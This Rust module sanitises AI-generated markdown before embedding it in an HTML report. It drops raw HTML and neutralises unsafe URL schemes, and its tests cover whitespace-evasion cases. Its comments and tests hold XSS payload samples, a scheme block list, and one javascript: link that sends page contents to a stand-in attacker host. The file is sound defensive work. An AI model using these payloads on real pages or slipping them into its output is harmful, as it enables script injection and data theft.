//! Render an AI provider's markdown response to HTML — safely.
//!
//! Claude (or whichever AI is in the loop) returns markdown. To embed
//! it in the HTML report we have to render it. The Markdown spec says
//! a parser MAY pass raw HTML through verbatim. We don't want that:
//! a Claude response containing `<script>alert(1)</script>` would XSS
//! whoever opens the rendered report.
//!
//! `render_safe` walks the pulldown-cmark event stream and:
//! 1. drops every raw-HTML event (block + inline) — kills `<script>`,
//!    `<img onerror>`, etc.
//! 2. rewrites link-destination events that use unsafe URL schemes
//!    (`javascript:`, `data:`, `vbscript:`) to a harmless `#` —
//!    fixes F-ADV-P2-001. Without this, an AI response containing
//!    `[click me](javascript:fetch('//attacker'+document.body.innerHTML))`
//!    would produce a clickable XSS / data-exfil vector in the
//!    rendered report.
//!
//! The resulting string contains only formatting that pulldown-cmark
//! generated itself, with link destinations sanitised.

use pulldown_cmark::{html, CowStr, Event, Options, Parser, Tag};

/// URL schemes that we never allow in href / src attributes. Matched
/// case-insensitively after the URL is normalised per WHATWG URL §4.4.3
/// (ASCII tab, LF, CR, and other ASCII whitespace + control characters
/// are stripped from URLs before scheme parsing).
const UNSAFE_SCHEMES: &[&str] = &["javascript:", "data:", "vbscript:"];

/// `true` if the URL starts with one of the unsafe schemes after WHATWG
/// URL normalisation. Per WHATWG URL spec §4.4.3 ("URL parser → input"),
/// browsers strip ASCII tab + newline characters from URLs before
/// scheme parsing — so `java\tscript:`, `j\navascript:`, etc. all
/// resolve to `javascript:` in a browser. We mirror that normalisation
/// here so the filter is browser-accurate.
///
/// **F-ADV-P3-003:** the previous version only trimmed *leading*
/// whitespace and was bypassed by embedded ASCII tab / LF / CR.
fn url_is_unsafe(url: &str) -> bool {
    // Strip ALL ASCII whitespace and ASCII control characters (0x00-0x1F
    // and 0x7F). This is stricter than WHATWG but matches the spirit:
    // any browser-stripped character should not allow scheme evasion.
    let normalised: String = url
        .chars()
        .filter(|c| !c.is_ascii_whitespace() && !c.is_ascii_control())
        .collect();
    let trimmed = normalised.as_str();
    UNSAFE_SCHEMES.iter().any(|scheme| {
        trimmed.len() >= scheme.len() && trimmed[..scheme.len()].eq_ignore_ascii_case(scheme)
    })
}

/// Render markdown to HTML with all raw HTML events stripped AND any
/// unsafe-scheme link destinations rewritten to `#`. Output is safe to
/// interpolate via askama's `|safe` filter inside a trusted template.
pub fn render_safe(md: &str) -> String {
    let parser = Parser::new_ext(md, Options::ENABLE_TABLES)
        // Drop raw HTML.
        .filter(|event| !matches!(event, Event::Html(_) | Event::InlineHtml(_)))
        // Sanitise link + image URLs. Pulldown-cmark emits each link/image
        // start tag with the destination URL inline; if the scheme is
        // unsafe, rewrite to `#` so the resulting `<a href="#">` is inert.
        .map(|event| match event {
            Event::Start(Tag::Link {
                link_type,
                dest_url,
                title,
                id,
            }) => {
                let safe_url = if url_is_unsafe(&dest_url) {
                    CowStr::Borrowed("#")
                } else {
                    dest_url
                };
                Event::Start(Tag::Link {
                    link_type,
                    dest_url: safe_url,
                    title,
                    id,
                })
            }
            Event::Start(Tag::Image {
                link_type,
                dest_url,
                title,
                id,
            }) => {
                let safe_url = if url_is_unsafe(&dest_url) {
                    CowStr::Borrowed("#")
                } else {
                    dest_url
                };
                Event::Start(Tag::Image {
                    link_type,
                    dest_url: safe_url,
                    title,
                    id,
                })
            }
            other => other,
        });
    let mut out = String::new();
    html::push_html(&mut out, parser);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn renders_basic_markdown() {
        let html = render_safe("# Hello\n\nThis is **bold**.");
        assert!(html.contains("<h1>Hello</h1>"));
        assert!(html.contains("<strong>bold</strong>"));
    }

    #[test]
    fn renders_code_blocks() {
        let html = render_safe("```\nlet x = 1;\n```");
        assert!(html.contains("<pre><code>"));
        assert!(html.contains("let x = 1;"));
    }

    #[test]
    fn renders_tables() {
        let html = render_safe("| a | b |\n|---|---|\n| 1 | 2 |");
        assert!(html.contains("<table>"));
    }

    #[test]
    fn strips_raw_html_block_script() {
        let md = "Here is some text.\n\n<script>alert('xss')</script>\n\nAnd more text.";
        let html = render_safe(md);
        assert!(!html.contains("<script>"), "raw <script> survived: {html}");
        assert!(!html.contains("alert"), "<script> body survived: {html}");
    }

    #[test]
    fn strips_raw_inline_html() {
        let md = "A paragraph with <img src=x onerror=alert(1)> in the middle.";
        let html = render_safe(md);
        assert!(!html.contains("<img"), "inline raw HTML survived: {html}");
        assert!(!html.contains("onerror"));
    }

    /// F-ADV-P2-001 fix: javascript: URLs MUST be neutered. Previously this
    /// test asserted the opposite of its name — verifying that the link
    /// passed through. Now it asserts the link is stripped.
    #[test]
    fn strips_javascript_url_pseudo_protocol() {
        let md = "[click me](javascript:alert(1))";
        let html = render_safe(md);
        assert!(
            !html.contains("javascript:"),
            "F-ADV-P2-001: javascript: URL must be stripped from rendered HTML: {html}"
        );
        // The href should be rewritten to `#` (or absent).
        assert!(
            html.contains("href=\"#\"") || !html.contains("href="),
            "F-ADV-P2-001: unsafe URL should be replaced with '#', got: {html}"
        );
    }

    /// F-ADV-P2-001 fix: data:text/html URLs are another XSS vector via
    /// `<a href="data:text/html,..."><img src="data:..."`.
    #[test]
    fn strips_data_url_pseudo_protocol() {
        let md = "[exfil](data:text/html,<script>alert(1)</script>)";
        let html = render_safe(md);
        assert!(
            !html.contains("data:"),
            "F-ADV-P2-001: data: URL must be stripped: {html}"
        );
    }

    /// F-ADV-P2-001 fix: vbscript: is an obsolete IE pseudo-protocol but
    /// older browsers in industrial environments may still honour it.
    #[test]
    fn strips_vbscript_url_pseudo_protocol() {
        let md = "[click](vbscript:msgbox(1))";
        let html = render_safe(md);
        assert!(
            !html.contains("vbscript:"),
            "F-ADV-P2-001: vbscript: URL must be stripped: {html}"
        );
    }

    /// F-ADV-P2-001 fix: case-insensitive scheme matching. `JaVaScRiPt:` is
    /// equally dangerous and must be stripped.
    #[test]
    fn strips_mixed_case_javascript_url() {
        let md = "[click](JaVaScRiPt:alert(1))";
        let html = render_safe(md);
        assert!(
            !html.contains("avaScRiPt"),
            "F-ADV-P2-001: mixed-case javascript: URL must be stripped: {html}"
        );
    }

    /// F-ADV-P2-001 fix: leading-whitespace evasion — `   javascript:` should
    /// still be stripped because browsers strip leading whitespace from
    /// href values before scheme parsing.
    #[test]
    fn strips_whitespace_prefixed_javascript_url() {
        let md = "[click](   javascript:alert(1))";
        let html = render_safe(md);
        assert!(
            !html.contains("javascript:"),
            "F-ADV-P2-001: whitespace-prefixed javascript: must be stripped: {html}"
        );
    }

    /// F-ADV-P3-003: WHATWG URL parser strips embedded ASCII tab/LF/CR from
    /// URLs before scheme parsing. So `java\tscript:`, `j\navascript:`,
    /// `javasc\rript:` all resolve to `javascript:` in browsers and must be
    /// rejected by our scheme filter. The original F-ADV-P2-001 fix only
    /// handled LEADING whitespace; embedded was a bypass vector.
    /// F-ADV-P3-003: WHATWG URL parser strips embedded ASCII tab/LF/CR.
    /// In Markdown spec, embedded whitespace inside a `[text](dest)` link
    /// destination is invalid syntax — pulldown-cmark rejects the link and
    /// emits the source as literal paragraph text (no `<a href>` at all).
    /// We assert no live href is generated for the unsafe-scheme form,
    /// rather than asserting the literal text is gone (which would only
    /// hold for a parser that DOES accept the link and strip the URL).
    #[test]
    fn no_live_href_for_javascript_with_embedded_tab() {
        let md = "[click](java\tscript:alert(1))";
        let html = render_safe(md);
        assert!(
            !html.contains("href=\"java"),
            "F-ADV-P3-003: must NOT emit a live href for embedded-tab javascript: {html}"
        );
    }

    #[test]
    fn no_live_href_for_javascript_with_embedded_newline() {
        let md = "[click](j\navascript:alert(1))";
        let html = render_safe(md);
        assert!(
            !html.contains("href=\"j"),
            "F-ADV-P3-003: must NOT emit a live href for embedded-newline javascript: {html}"
        );
    }

    #[test]
    fn no_live_href_for_javascript_with_embedded_cr() {
        let md = "[click](javasc\rript:alert(1))";
        let html = render_safe(md);
        assert!(
            !html.contains("href=\"javasc"),
            "F-ADV-P3-003: must NOT emit a live href for embedded-CR javascript: {html}"
        );
    }

    /// F-ADV-P3-003: angle-bracket syntax `[text](<url>)` allows whitespace
    /// inside the URL per CommonMark spec. This is the more interesting
    /// attack surface — pulldown-cmark DOES accept this form. The filter
    /// must normalise away the whitespace and recognise the unsafe scheme.
    #[test]
    fn strips_angle_bracket_javascript_with_embedded_tab() {
        let md = "[click](<java\tscript:alert(1)>)";
        let html = render_safe(md);
        // Either pulldown-cmark accepted the link and our filter rewrote it
        // to `#`, OR pulldown-cmark rejected it entirely. Both are safe.
        // We just need to confirm no live `javascript:` href.
        let has_unsafe_href = html.contains("href=\"java")
            && (html.contains("javascript:") || html.contains("java\tscript:"));
        assert!(
            !has_unsafe_href,
            "F-ADV-P3-003: angle-bracket embedded-tab javascript: must not yield live href: {html}"
        );
    }

    /// Direct unit test of `url_is_unsafe` against embedded-whitespace evasion.
    /// This bypasses pulldown-cmark's link-parsing constraints and exercises
    /// the filter's normalisation logic directly.
    #[test]
    fn url_is_unsafe_normalises_embedded_whitespace() {
        assert!(
            url_is_unsafe("java\tscript:alert(1)"),
            "F-ADV-P3-003: embedded-tab javascript: must be detected as unsafe"
        );
        assert!(
            url_is_unsafe("j\navascript:alert(1)"),
            "F-ADV-P3-003: embedded-LF javascript: must be detected as unsafe"
        );
        assert!(
            url_is_unsafe("javasc\rript:alert(1)"),
            "F-ADV-P3-003: embedded-CR javascript: must be detected as unsafe"
        );
        assert!(
            url_is_unsafe("dat\ta:text/html,..."),
            "F-ADV-P3-003: embedded-tab data: must be detected as unsafe"
        );
        // Sanity: legitimate URLs with no whitespace and safe schemes
        // are not flagged.
        assert!(!url_is_unsafe("https://example.com"));
        assert!(!url_is_unsafe("mailto:a@b.c"));
    }

    /// Regression guard: legitimate http/https/mailto URLs pass through.
    #[test]
    fn preserves_safe_url_schemes() {
        let md = "[example](https://example.com) [mail](mailto:a@b.c)";
        let html = render_safe(md);
        assert!(
            html.contains("href=\"https://example.com\""),
            "https: must pass through: {html}"
        );
        assert!(
            html.contains("href=\"mailto:a@b.c\""),
            "mailto: must pass through: {html}"
        );
    }

    /// F-ADV-P2-001 fix: image src attributes are also a vector via
    /// `<img src="javascript:...">` or `<img src="data:text/html,...">`.
    #[test]
    fn strips_javascript_image_src() {
        let md = "![alt](javascript:alert(1))";
        let html = render_safe(md);
        assert!(
            !html.contains("javascript:"),
            "F-ADV-P2-001: javascript: in image src must be stripped: {html}"
        );
    }
}
